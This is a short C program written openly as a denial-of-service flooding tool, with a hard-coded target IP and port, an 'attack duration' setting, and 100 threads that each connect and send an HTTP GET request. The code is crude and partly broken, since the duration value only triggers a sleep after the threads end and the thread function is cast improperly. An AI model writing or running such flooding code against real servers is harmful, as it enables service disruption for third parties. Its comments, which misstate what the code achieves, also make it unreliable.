#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

// Define the target IP address
char *target_ip = "192.168.1.1";

// Define the target port
int target_port = 80;

// Define the attack duration in seconds
int attack_duration = 60;

// Create a function to send a single HTTP GET request
void attack() {
    // Create a socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(1);
    }

    // Connect to the target
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(target_ip);
    target_addr.sin_port = htons(target_port);
    if (connect(sock, (struct sockaddr *) &target_addr, sizeof(target_addr)) == -1) {
        perror("connect");
        exit(1);
    }

    // Send an HTTP GET request
    char *request = "GET / HTTP/1.1\r\n\r\n";
    if (send(sock, request, strlen(request), 0) == -1) {
        perror("send");
        exit(1);
    }

    // Close the socket
    close(sock);
}

// Create a thread pool to send multiple HTTP GET requests
int main() {
    // Create a thread pool
    pthread_t threads[100];
    for (int i = 0; i < 100; i++) {
        pthread_create(&threads[i], NULL, (void *) attack, NULL);
    }

    // Join the threads
    for (int i = 0; i < 100; i++) {
        pthread_join(threads[i], NULL);
    }

    // Sleep for the specified attack duration
    sleep(attack_duration);

    return 0;
}
